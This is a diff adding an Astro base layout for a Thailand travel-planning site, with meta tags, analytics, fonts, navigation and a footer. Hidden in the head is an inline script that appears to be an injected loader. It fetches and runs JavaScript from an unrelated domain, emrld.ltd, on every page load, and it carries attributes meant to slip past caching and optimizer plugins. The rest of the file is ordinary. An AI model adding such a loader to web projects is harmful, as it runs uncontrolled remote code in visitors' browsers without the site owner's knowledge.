@@ -1,0 +1,131 @@
+---
+import '../styles/global.css';
+import { site, absUrl } from '../lib/site';
+import { jsonLdFor } from '../lib/jsonld';
+import type { Page } from '../lib/content';
+
+interface Props {
+  page: Page;
+}
+
+const { page } = Astro.props;
+const url = absUrl(page.path);
+const image = page.photo ? absUrl(page.photo) : absUrl('/photos/bangkok.svg');
+const blocks = jsonLdFor(page);
+---
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <script is:inline async src={`https://www.googletagmanager.com/gtag/js?id=${site.gaMeasurementId}`}></script>
+    <script is:inline define:vars={{ measurementId: site.gaMeasurementId }}>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', measurementId);
+    </script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <meta name="color-scheme" content="light" />
+    <title>{page.title}</title>
+    <meta name="description" content={page.description} />
+    <meta name="author" content={site.name} />
+    <meta name="application-name" content={site.shortName} />
+    <meta name="theme-color" content={site.themeColor} />
+    <meta name="robots" content="index, follow, max-image-preview:large" />
+    <link rel="canonical" href={url} />
+    <link rel="alternate" hreflang="en" href={url} />
+    <link rel="alternate" hreflang="x-default" href={url} />
+    <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap-index.xml" />
+    <meta property="og:title" content={page.title} />
+    <meta property="og:description" content={page.description} />
+    <meta property="og:url" content={url} />
+    <meta property="og:type" content={page.path === '/' ? 'website' : 'article'} />
+    <meta property="og:site_name" content={site.shortName} />
+    <meta property="og:locale" content={site.locale} />
+    <meta property="og:image" content={image} />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content={page.title} />
+    <meta name="twitter:description" content={page.description} />
+    <meta name="twitter:image" content={image} />
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,400;0,600;0,650;0,700;1,400&display=swap"
+      rel="stylesheet"
+    />
+    {
+      blocks.map((block) => (
+        <script type="application/ld+json" set:html={JSON.stringify(block)} />
+      ))
+    }
+    <script is:inline nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
+      (function () {
+        var script = document.createElement("script");
+        script.async = 1;
+        script.setAttribute("data-cmp-ab","2");
+        script.src = 'https://emrld.ltd/NTg4OTc4.js?t=588978';
+        document.head.appendChild(script);
+      })();
+    </script>
+  </head>
+  <body>
+    <a class="skip" href="#main">Skip to content</a>
+    <header class="topbar">
+      <div class="bar wrap">
+        <a class="wordmark" href="/">{site.shortName}</a>
+        <nav class="desk-nav" aria-label="Primary">
+          <a href="/destinations">Destinations</a>
+          <a href="/itineraries">Itineraries</a>
+          <a href="/plan">Plan</a>
+          <a href="/get-there">Get there</a>
+          <a href="/interests">Interests</a>
+        </nav>
+        <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="phone-menu">
+          Menu
+        </button>
+      </div>
+      <nav id="phone-menu" class="phone-menu" hidden>
+        <a href="/destinations">Destinations</a>
+        <a href="/itineraries">Itineraries</a>
+        <a href="/plan">Plan</a>
+        <a href="/get-there">Get there</a>
+        <a href="/interests">Interests</a>
+      </nav>
+    </header>
+    <main id="main">
+      <slot />
+    </main>
+    <footer class="site-footer">
+      <div class="wrap footer-grid">
+        <div class="footer-col">
+          <strong>{site.shortName}</strong>
+          <p>First-trip planning for Thailand. Districts, monsoon flips, trains, and what to book.</p>
+        </div>
+        <div class="footer-col">
+          <span>Plan</span>
+          <a href="/plan/when-to-go">When to go</a>
+          <a href="/plan/visas-and-tdac">Visas and TDAC</a>
+          <a href="/plan/trains-and-ferries">Trains and ferries</a>
+          <a href="/plan/grab-and-bts">Grab and BTS</a>
+        </div>
+        <div class="footer-col">
+          <span>Site</span>
+          <a href="/about">About</a>
+          <a href="/privacy">Privacy</a>
+        </div>
+      </div>
+    </footer>
+    <script>
+      const btn = document.querySelector<HTMLButtonElement>('.menu-toggle');
+      const menu = document.querySelector<HTMLElement>('#phone-menu');
+      btn?.addEventListener('click', () => {
+        const open = btn.getAttribute('aria-expanded') === 'true';
+        btn.setAttribute('aria-expanded', String(!open));
+        menu?.toggleAttribute('hidden', open);
+      });
+    </script>
+  </body>
+</html>
